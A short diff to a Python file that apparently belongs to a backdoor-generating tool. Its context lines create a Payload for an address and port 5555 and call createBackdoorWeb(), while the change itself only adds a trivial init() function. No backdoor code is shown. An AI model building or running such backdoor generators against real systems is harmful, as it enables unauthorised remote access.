@@ -38,6 +38,13 @@ class Payload(object):
 
 
 
+
 if __name__ == '__main__':
     payload = Payload("192.168.8.8","5555")
     payload.createBackdoorWeb()
+
+def init():
+    try:
+        print("x")
+    except Exception as e:
+        print(type(e).__name__)
